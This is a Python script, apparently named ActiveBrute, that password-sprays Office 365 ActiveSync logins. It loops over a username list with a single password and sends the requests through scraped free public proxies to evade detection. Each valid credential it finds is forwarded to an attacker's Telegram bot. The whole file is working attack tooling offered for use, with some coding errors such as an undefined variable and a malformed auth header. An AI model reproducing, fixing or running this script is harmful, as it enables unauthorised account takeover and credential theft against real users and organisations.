# python3 ActiveBrute.py <userlist.txt> <password>

import requests
from bs4 import BeautifulSoup
from random import choice
from requests.auth import HTTPBasicAuth
from sys import argv
import base64



targeturl = 'https://outlook.office365.com/Microsoft-Server-ActiveSync'
telegrambot_key = 'botapikey'
telegramchat_id = 'chatid'

def proxy_generator():
    response = requests.get("https://sslproxies.org/")
    soup = BeautifulSoup(response.content, 'html5lib')
    proxy = {'https': choice(list(map(lambda x:x[0]+':'+x[1], list(zip(map(lambda x:x.text, soup.findAll('td')[::8]), map(lambda x:x.text, soup.findAll('td')[1::8]))))))}
    return proxy


def check_proxy(request_method, url, **kwargs):
    print("Finding live proxy...")
    while True:
        try:
            proxy = proxy_generator()
            response = requests.request(request_method, url, proxies=proxy, timeout=3, **kwargs)
            break
        except:
            pass
    return proxy


def encode_creds(user):
    userpass = user + ":" + argv[2]
    b64_user = userpass.encode('ascii')
    b64_user = base64.b64encode(b64_user)
    b64_user = b64_user.decode('ascii')
    print("Trying: " + userpass + " - Base64: " + b64_user)
    
    return b64_user
    
    
def check_creds(creds):
    while True:
        try:
            proxy = check_proxy('get', "https://ipinfo.io/json")
            req = requests.get(proxies=proxy, timeout=3, url=targeturl, 
            headers = {'Authorization' : "'Basic" + creds + "'"})
            if req.status_code == 505:
                print("It's a hit! - " + creds)
                postdata = {'chat_id' : telegramchat_id, 'text' : 'Cred hit: ' + creds}
                hit = requests.post('https://api.telegram.org/' + telegrambot + '/sendMessage', data=postdata)
                break
            else:
                print("Wrong credentials!")
                break
        except:
            print("Proxy error!")
            pass

    
if __name__ == '__main__':
    with open(argv[1], 'r') as userfile:
        for line in userfile.readlines():
            line = line.replace('\n', '')
            encoded = encode_creds(line)
            test_creds = check_creds(encoded)
            
    
        
    